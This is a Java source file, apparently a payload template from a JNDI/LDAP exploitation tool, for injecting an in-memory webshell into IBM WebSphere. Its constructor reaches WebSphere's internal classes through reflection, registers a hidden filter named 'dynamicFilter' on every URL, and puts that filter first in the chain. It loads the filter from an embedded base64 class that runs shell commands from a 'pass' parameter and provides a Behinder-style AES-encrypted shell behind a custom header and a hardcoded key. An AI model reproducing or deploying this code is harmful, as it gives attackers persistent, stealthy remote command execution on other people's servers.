package com.mickhu.ldap.template;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.BASE64Decoder;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.List;

public class WebsphereMemshellTemplate extends AbstractTranslet {

    public WebsphereMemshellTemplate(){
        try{
            String filterName = "dynamicFilter";
            String urlPattern = "/*";

            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("wsThreadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            Object[] obj_arr = (Object[]) obj;
            for(int j = 0; j < obj_arr.length; j++){
                Object o = obj_arr[j];
                if(o == null) continue;

                if(o.getClass().getName().endsWith("WebContainerRequestState")){
                    Object request = o.getClass().getMethod("getCurrentThreadsIExtendedRequest", new Class[0]).invoke(o, new Object[0]);
                    Object servletContext = request.getClass().getMethod("getServletContext", new Class[0]).invoke(request, new Object[0]);

                    field = servletContext.getClass().getDeclaredField("context");
                    field.setAccessible(true);
                    Object context = field.get(servletContext);

                    field = context.getClass().getSuperclass().getDeclaredField("config");
                    field.setAccessible(true);
                    Object webAppConfiguration = field.get(context);

                    Method method = null;
                    Method[] methods = webAppConfiguration.getClass().getMethods();
                    for(int i = 0; i < methods.length; i++){
                        if(methods[i].getName().equals("getFilterMappings")){
                            method = methods[i];
                            break;
                        }
                    }
                    List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);

                    boolean flag = false;
                    for(int i = 0; i < filerMappings.size(); i++){
                        Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
                        String name = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }

                    //如果已存在同名的 Filter，就不在添加，防止重复添加
                    if(!flag){
                        System.out.println("[+] Add Dynamic Filter");

                        ClassLoader cl = Thread.currentThread().getContextClassLoader();
                        try{
                            clazz = cl.loadClass("com.mickhu.ldap.template.DynamicFilterTemplate");
                        }catch(ClassNotFoundException e){
                            BASE64Decoder base64Decoder = new BASE64Decoder();
                            String codeClass = "yv66vgAAADIBXgoAQgCnCACoCQBdAKkIAKoJAF0AqwgArAkAXQCtCgBdAK4JAK8AsAgAsQoAsgCzCAC0CwBIALUIALYKABMAtwoAEwC4CQC5ALoIALsHALwIAL0IAL4IAHcIAL8HAMAKAMEAwgoAwQDDCgDEAMUKABgAxggAxwoAGADICgAYAMkLAEkAygoAywCzBwDMCwAiAM0LACIAzggAzwsAIgDQCADRCwDSANMIANQKANUA1gcA1wcA2AoALACnCwDSANkKACwA2ggA2woALADcCgAsAN0KABMA3goAKwDfCgDVAOAHAOEKADYApwsASADiCgDjAOQKADYA5QoA1QDmCQBdAOcIAOgHAOkHAHwHAOoKAD4A6wcA7AoA7QDuCgDtAO8KAPAA8QoAPgDyCADzBwD0BwD1BwD2CgBKAPcLAPgA+QgA+goAQAD7BwD8CgBCAP0JAP4A/wcBAAoAPgEBCAECCgDwAQMKAP4BBAcBBQoAVwD3BwEGCgBZAPcHAQcKAFsA9wcBCAcBCQEAEm15Q2xhc3NMb2FkZXJDbGF6egEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAQYmFzaWNDbWRTaGVsbFB3ZAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAE2JlaGluZGVyU2hlbGxIZWFkZXIBABBiZWhpbmRlclNoZWxsUHdkAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADFMY29tL2ZlaWhvbmcvbGRhcC90ZW1wbGF0ZS9EeW5hbWljRmlsdGVyVGVtcGxhdGU7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcBCgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQADY21kAQABawEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQACW0IBAAlldmlsQ2xhc3MBAApldmlsT2JqZWN0AQASTGphdmEvbGFuZy9PYmplY3Q7AQAMdGFyZ2V0TWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAA1TdGFja01hcFRhYmxlBwC8BwB1BwD2AQAHZGVzdHJveQEACmluaXRpYWxpemUBAAJleAEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEABWNsYXp6AQAGbWV0aG9kAQAEY29kZQEABWJ5dGVzAQAiTGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAtTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb247BwEIBwDqBwD8BwDpBwELBwEABwEFBwEGBwEHAQAKU291cmNlRmlsZQEAGkR5bmFtaWNGaWx0ZXJUZW1wbGF0ZS5qYXZhDABlAGYBAARwYXNzDABhAGIBAAxYLU9wdGlvbnMtQWkMAGMAYgEAEGU0NWUzMjlmZWI1ZDkyNWIMAGQAYgwAjwBmBwEMDAENAQ4BAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcBDwwBEAERAQAEdHlwZQwBEgETAQAFYmFzaWMMAPMBFAwBFQEWBwEXDAEYAGIBAAEvAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEAAi9DAQARamF2YS91dGlsL1NjYW5uZXIHARkMARoBGwwBHAEdBwEeDAEfASAMAGUBIQEAAlxBDAEiASMMASQBJQwBJgEnBwEoAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwBKQETDAEqASUBAARQT1NUDAErASwBAAF1BwEtDAEuAS8BAANBRVMHATAMATEBMgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBMwE0DAE1ATYBAAAMATUBNwwBOAElDAE5AToMAGUBOwwAbAE8AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwBPQE+BwE/DAFAASUMAUEBQgwBQwFEDABfAGABAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgwBRQFGAQAQamF2YS9sYW5nL09iamVjdAcBRwwBSAFJDAFKAUsHAQsMAUwBTQwBTgFPAQAGZXF1YWxzAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBUABmBwFRDAByAVIBACdjb20uZmVpaG9uZy5sZGFwLnRlbXBsYXRlLk15Q2xhc3NMb2FkZXIMAVMBVAEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uDAFVAVYHAVcMAVgAYAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAVkBVgEDHHl2NjZ2Z0FBQURJQUd3b0FCUUFXQndBWENnQUNBQllLQUFJQUdBY0FHUUVBQmp4cGJtbDBQZ0VBR2loTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPeWxXQVFBRVEyOWtaUUVBRDB4cGJtVk9kVzFpWlhKVVlXSnNaUUVBRWt4dlkyRnNWbUZ5YVdGaWJHVlVZV0pzWlFFQUJIUm9hWE1CQUNsTVkyOXRMMlpsYVdodmJtY3ZiR1JoY0M5MFpXMXdiR0YwWlM5TmVVTnNZWE56VEc5aFpHVnlPd0VBQVdNQkFCZE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3dFQUMyUmxabWx1WlVOc1lYTnpBUUFzS0Z0Q1RHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUFWaWVYUmxjd0VBQWx0Q0FRQUxZMnhoYzNOTWIyRmtaWElCQUFwVGIzVnlZMlZHYVd4bEFRQVNUWGxEYkdGemMweHZZV1JsY2k1cVlYWmhEQUFHQUFjQkFDZGpiMjB2Wm1WcGFHOXVaeTlzWkdGd0wzUmxiWEJzWVhSbEwwMTVRMnhoYzNOTWIyRmtaWElNQUE4QUdnRUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUZ5aGJRa2xKS1V4cVlYWmhMMnhoYm1jdlEyeGhjM003QUNFQUFnQUZBQUFBQUFBQ0FBQUFCZ0FIQUFFQUNBQUFBRG9BQWdBQ0FBQUFCaW9ydHdBQnNRQUFBQUlBQ1FBQUFBWUFBUUFBQUFRQUNnQUFBQllBQWdBQUFBWUFDd0FNQUFBQUFBQUdBQTBBRGdBQkFBa0FEd0FRQUFFQUNBQUFBRVFBQkFBQ0FBQUFFTHNBQWxrcnR3QURLZ01xdnJZQUJMQUFBQUFDQUFrQUFBQUdBQUVBQUFBSUFBb0FBQUFXQUFJQUFBQVFBQkVBRWdBQUFBQUFFQUFUQUE0QUFRQUJBQlFBQUFBQ0FCVT0MAVoBWwwBXAFdAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAL2NvbS9mZWlob25nL2xkYXAvdGVtcGxhdGUvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lzRW1wdHkBAAMoKVoBAAxqYXZhL2lvL0ZpbGUBAAlzZXBhcmF0b3IBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmFwcGVuZAEALShMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBAA1nZXRTdXBlcmNsYXNzAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwAhAF0AQgABAF4ABAACAF8AYAAAAAIAYQBiAAAAAgBjAGIAAAACAGQAYgAAAAUAAQBlAGYAAQBnAAAAWQACAAEAAAAbKrcAASoSArUAAyoSBLUABSoSBrUAByq3AAixAAAAAgBoAAAAGgAGAAAAFgAEABEACgASABAAEwAWABcAGgAYAGkAAAAMAAEAAAAbAGoAawAAAAEAbABtAAIAZwAAADUAAAACAAAAAbEAAAACAGgAAAAGAAEAAAAdAGkAAAAWAAIAAAABAGoAawAAAAAAAQBuAG8AAQBwAAAABAABAHEAAQByAHMAAgBnAAAC5AAHAAoAAAGpsgAJEgq2AAsrEgy5AA0CAMYAkSsSDLkADQIAEg62AA+ZAIErKrQAA7kADQIAOgQZBMYAbRkEtgAQmgBlAToFsgAREhK2AA+ZABsGvQATWQMSFFNZBBIVU1kFGQRTOgWnABgGvQATWQMSFlNZBBIXU1kFGQRTOgW7ABhZuAAZGQW2ABq2ABu3ABwSHbYAHrYAHzoGLLkAIAEAGQa2ACGnAQorwAAiKrQABbkAIwIAxgDyK8AAIrkAJAEAEiW2AA+ZANQqtAAHOgQrwAAiuQAmAQASJxkEuQAoAwASKbgAKjoFGQUFuwArWbsALFm3AC0rwAAiuQAmAQASJ7kALgIAtgAvEjC2ADG2ADK2ADMSKbcANLYANRkFuwA2WbcANyu5ADgBALYAObYAOrYAOzoGKrQAPBI9Bb0APlkDEj9TWQQSQFO2AEEBBb0AQlkDGQZTWQS4AEO2AERTtgBFwAA+OgcZB7YARjoIGQcSRwW9AD5ZAxJIU1kEEklTtgBBOgkZCRkIBb0AQlkDK1NZBCxTtgBFV6cAFToEGQS2AEunAAstKyy5AEwDALEAAQCxAZMBlgBKAAMAaAAAAG4AGwAAACEACAAkACMAJgAvACcAPAAoAD8AKQBKACoAYgAsAHcALgCTAC8AngAxALEANADCADUAyAA2ANoANwDhADgBFQA5AS8AOgFhADsBaAA8AX8APQGTAEEBlgA/AZgAQAGdAEEBoABDAagARQBpAAAAjgAOAD8AXwB0AHUABQCTAAsAdgBiAAYALwBvAHcAYgAEAMgAywB4AGIABADhALIAeQB6AAUBLwBkAHsAfAAGAWEAMgB9AGAABwFoACsAfgB/AAgBfwAUAIAAgQAJAZgABQCCAIMABAAAAakAagBrAAAAAAGpAIQAhQABAAABqQCGAIcAAgAAAakAiACJAAMAigAAABkACP0AYgcAiwcAjBT5ACYC+wDxQgcAjQkHAHAAAAAGAAIAWQBxAAEAjgBmAAEAZwAAACsAAAABAAAAAbEAAAACAGgAAAAGAAEAAABKAGkAAAAMAAEAAAABAGoAawAAAAIAjwBmAAEAZwAAAgMABwAHAAAAqbgAQ7YAREwqKxJNtgBOtQA8pwB/TSu2AFBOAToEGQTHADMtEkKlAC0tEj0GvQA+WQMSP1NZBLIAUVNZBbIAUVO2AEE6BKf/2DoFLbYAU06n/84SVDoFuwA2WbcANxkFtgA6OgYZBAS2AFUqGQQrBr0AQlkDGQZTWQQDuABWU1kFGQa+uABWU7YARcAAPrUAPKcAGEwrtgBYpwAQTCu2AFqnAAhMK7YAXLEABQAHABEAFABPACgARQBIAFIAAACQAJMAVwAAAJAAmwBZAAAAkACjAFsAAwBoAAAAagAaAAAATgAHAFAAEQBgABQAUQAVAFIAGgBTAB0AVAAoAFYARQBZAEgAVwBKAFgATwBZAFIAXABWAF0AZABeAGoAXwCQAGcAkwBhAJQAYgCYAGcAmwBjAJwAZACgAGcAowBlAKQAZgCoAGgAaQAAAHAACwBKAAUAkACRAAUAGgB2AJIAYAADAB0AcwCTAIEABABWADoAlABiAAUAZAAsAJUAfAAGABUAewCCAJYAAgAHAIkAlwCYAAEAlAAEAIIAmQABAJwABACCAJoAAQCkAAQAggCbAAEAAACpAGoAawAAAIoAAAA6AAn/ABQAAgcAnAcAnQABBwCe/gAIBwCeBwCfBwCgagcAoQn/AD0AAQcAnAAAQgcAokcHAKNHBwCkBAABAKUAAAACAKY=";
                            byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                            method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                            method.setAccessible(true);
                            clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                        }

                        Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
                        Object filter = clazz.newInstance();
                        filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for(int i = 0; i < methods.length; i++){
                            if(methods[i].getName().equals("addFilterInfo")){
                                method = methods[i];
                                break;
                            }
                        }
                        method.invoke(webAppConfiguration, new Object[]{filterConfig});

                        field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
                        field.setAccessible(true);
                        Object original = field.get(filterConfig);

                        //设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
                        field.set(filterConfig, null);

                        method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
                        method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});

                        //addMappingForUrlPatterns 流程走完，再将其设置为原来的值
                        field.set(filterConfig, original);

                        method = null;
                        methods = webAppConfiguration.getClass().getMethods();
                        for(int i = 0; i < methods.length; i++){
                            if(methods[i].getName().equals("getUriFilterMappings")){
                                method = methods[i];
                                break;
                            }
                        }

                        //这里的目的是为了将我们添加的动态 Filter 放到第一位
                        List uriFilterMappingInfos = (List)method.invoke(webAppConfiguration, new Object[0]);
                        uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));
                    }

                    break;
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
